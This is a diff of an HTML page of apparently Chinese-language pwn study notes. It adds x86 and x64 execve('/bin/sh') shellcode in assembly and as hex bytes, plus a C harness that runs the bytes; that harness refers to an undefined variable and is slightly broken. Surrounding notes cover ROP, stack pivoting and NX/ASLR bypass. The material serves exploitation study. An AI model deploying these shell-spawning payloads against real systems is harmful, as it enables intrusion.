@@ -1880,6 +1880,33 @@
     shellcode
   </a>
   
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#x86" title="x86" class="md-nav__link">
+    x86
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#x64" title="x64" class="md-nav__link">
+    x64
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_3" title="制作方法" class="md-nav__link">
+    制作方法
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
 </li>
       
         <li class="md-nav__item">
@@ -1891,14 +1918,14 @@
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
-  <a href="#_3" title="寄存器赋值" class="md-nav__link">
+  <a href="#_4" title="寄存器赋值" class="md-nav__link">
     寄存器赋值
   </a>
   
 </li>
         
           <li class="md-nav__item">
-  <a href="#_4" title="栈转移" class="md-nav__link">
+  <a href="#_5" title="栈转移" class="md-nav__link">
     栈转移
   </a>
   
@@ -1917,14 +1944,14 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#_5" title="漏洞挖掘方法" class="md-nav__link">
+  <a href="#_6" title="漏洞挖掘方法" class="md-nav__link">
     漏洞挖掘方法
   </a>
   
 </li>
       
         <li class="md-nav__item">
-  <a href="#_6" title="保护" class="md-nav__link">
+  <a href="#_7" title="保护" class="md-nav__link">
     保护
   </a>
   
@@ -2519,6 +2546,33 @@
     shellcode
   </a>
   
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#x86" title="x86" class="md-nav__link">
+    x86
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#x64" title="x64" class="md-nav__link">
+    x64
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_3" title="制作方法" class="md-nav__link">
+    制作方法
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
 </li>
       
         <li class="md-nav__item">
@@ -2530,14 +2584,14 @@
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
-  <a href="#_3" title="寄存器赋值" class="md-nav__link">
+  <a href="#_4" title="寄存器赋值" class="md-nav__link">
     寄存器赋值
   </a>
   
 </li>
         
           <li class="md-nav__item">
-  <a href="#_4" title="栈转移" class="md-nav__link">
+  <a href="#_5" title="栈转移" class="md-nav__link">
     栈转移
   </a>
   
@@ -2556,14 +2610,14 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#_5" title="漏洞挖掘方法" class="md-nav__link">
+  <a href="#_6" title="漏洞挖掘方法" class="md-nav__link">
     漏洞挖掘方法
   </a>
   
 </li>
       
         <li class="md-nav__item">
-  <a href="#_6" title="保护" class="md-nav__link">
+  <a href="#_7" title="保护" class="md-nav__link">
     保护
   </a>
   
@@ -2621,9 +2675,8 @@
 <div class="codehilite"><pre><span></span>http://shell-storm.org
 http://shell-storm.org/shellcode/
 https://www.exploit-db.com
-https://www.exploit-db.com/shellcode/
+https://www.exploit-db.com/shellcodes/
 [linux pwn 入门教程 i春秋](https://bbs.ichunqiu.com/forum.php?mod=collection&amp;action=view&amp;ctid=157)
-[DynELF](https://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;tid=42933&amp;ctid=157)
 [格式化字符串](https://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;tid=43624&amp;ctid=157)
 [调整栈帧的技巧](https://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;tid=42534&amp;ctid=157)
 [PIE无关](https://bbs.ichunqiu.com/thread-43627-1-1.html)
@@ -2668,7 +2721,8 @@ example:`export LD_LIBRARY_PATH=/root/app/glibc22364/lib/</p>
 plt 指向got,采用延时绑定。printf函数中，0x404c010实际内容是下一条指令<code>push 0</code>,
 而plt.got是已经绑定的， puts函数的0x804bff4是指向实际puts函数的</p>
 <h2 id="shellcode">shellcode<a class="headerlink" href="#shellcode" title="Permanent link">&para;</a></h2>
-<div class="codehilite"><pre><span></span>jmp sh
+<h3 id="x86">x86<a class="headerlink" href="#x86" title="Permanent link">&para;</a></h3>
+<p><div class="codehilite"><pre><span></span>jmp sh
 run:
   pop ebx
   mov BYTE[ebx+7],0 ;append 0 to /bin/sh
@@ -2681,7 +2735,61 @@ sh:
   call run
   db &quot;/bin/sh&quot;
 </pre></div>
+20bytes:
+<div class="codehilite"><pre><span></span>  xor ecx,ecx 
+  cdq
+  push ecx 
+  push 0x68732f2f 
+  push 0x6e69622f 
+  mov ebx,esp 
+  mov al,0xb 
+  int 0x80
+</pre></div></p>
+<h3 id="x64">x64<a class="headerlink" href="#x64" title="Permanent link">&para;</a></h3>
+<p>24bytes:
+<div class="codehilite"><pre><span></span>global _start
+section .text
+_start:
+    push 59
+    pop rax
+    cdq
+    push rdx
+    mov rbx,0x68732f6e69622f2f
+    push rbx
+    push rsp
+    pop rdi
+    push rdx
+    push rdi
+    push rsp
+    pop rsi
+    syscall
+</pre></div>
+22bytes:
+<div class="codehilite"><pre><span></span>    push 59
+    pop rax
+    cdq
+    push rdx
+    mov rbx,0x68732f6e69622f2f
+    push rbx
+    push rsp
+    pop rdi
+  push rdx
+    pop rsi
+    syscall
+</pre></div></p>
+<div class="codehilite"><pre><span></span><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp"></span>
+<span class="kt">char</span> <span class="n">code24</span><span class="p">[]</span> <span class="o">=</span> <span class="s">&quot;</span><span class="se">\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05</span><span class="s">&quot;</span><span class="p">;</span>
+<span class="kt">char</span> <span class="n">code22</span><span class="p">[]</span> <span class="o">=</span> <span class="s">&quot;</span><span class="se">\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x54\x5f\x52\x5e\x0f\x05</span><span class="s">&quot;</span><span class="p">;</span>
+<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
+<span class="p">{</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;len:%d bytes</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">code24</span><span class="p">));</span>
+    <span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="kt">void</span><span class="p">(</span><span class="o">*</span><span class="p">)())</span> <span class="n">code</span><span class="p">)();</span>
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</pre></div>
 
+<h3 id="_3">制作方法<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h3>
 <p>linux 下
 - 使用<code>nasm [sourcecode] -o [target] -felf32</code>编译一个汇编文件 
 - 使用<code>objcopy -O binary [source.out] [target]</code>提取 shellcode的。
@@ -2722,24 +2830,24 @@ sh:
 <span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
 </pre></div></li>
 </ol>
-<h3 id="_3">寄存器赋值<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h3>
+<h3 id="_4">寄存器赋值<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h3>
 <p>构造栈结构
 <div class="codehilite"><pre><span></span>  *(pop eax ;ret)
   3
 </pre></div>
 将eax赋值为3</p>
-<h3 id="_4">栈转移<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h3>
+<h3 id="_5">栈转移<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h3>
 <p>寻找 leave;ret;指令，然后更改ebp的值即可
 leave= mov esp,ebp,pop ebp;</p>
 <h2 id="return-to-dynamic-resolver">return to Dynamic resolver<a class="headerlink" href="#return-to-dynamic-resolver" title="Permanent link">&para;</a></h2>
 <p>return to lib without information leakage</p>
-<h2 id="_5">漏洞挖掘方法<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h2>
+<h2 id="_6">漏洞挖掘方法<a class="headerlink" href="#_6" title="Permanent link">&para;</a></h2>
 <ul>
 <li>现成CMS注意DIFF</li>
 <li>根据漏洞PATCH</li>
 <li>根据漏洞写出EXP，发动攻击 </li>
 </ul>
-<h2 id="_6">保护<a class="headerlink" href="#_6" title="Permanent link">&para;</a></h2>
+<h2 id="_7">保护<a class="headerlink" href="#_7" title="Permanent link">&para;</a></h2>
 <p>NX:DEP 栈不可执行，可执行不可写 ROP绕过
 ALSR: 把每次载入的函数地址随机化，利用puts/printf 等leak出libc的实际地址</p>
 <h2 id="strace">strace<a class="headerlink" href="#strace" title="Permanent link">&para;</a></h2>
